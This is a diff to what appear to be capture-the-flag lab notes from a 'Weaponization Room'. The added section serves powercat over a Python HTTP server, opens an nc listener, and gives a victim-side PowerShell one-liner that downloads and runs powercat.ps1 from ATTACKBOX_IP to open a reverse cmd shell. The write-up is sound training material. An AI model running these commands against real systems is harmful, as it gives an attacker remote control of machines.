@@ -114,3 +114,25 @@ Restricted
 C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
 Welcome to Weaponization Room!
 ```
+- `powercat`
+```
+user@machine$ git clone https://github.com/besimorhino/powercat.git
+Cloning into 'powercat'...
+remote: Enumerating objects: 239, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
+Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
+Resolving deltas: 100% (72/72), done.
+
+user@machine$ cd powercat
+user@machine$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+```
+```
+user@machine$ nc -lvp 1337
+```
+Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,
+```
+C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+```
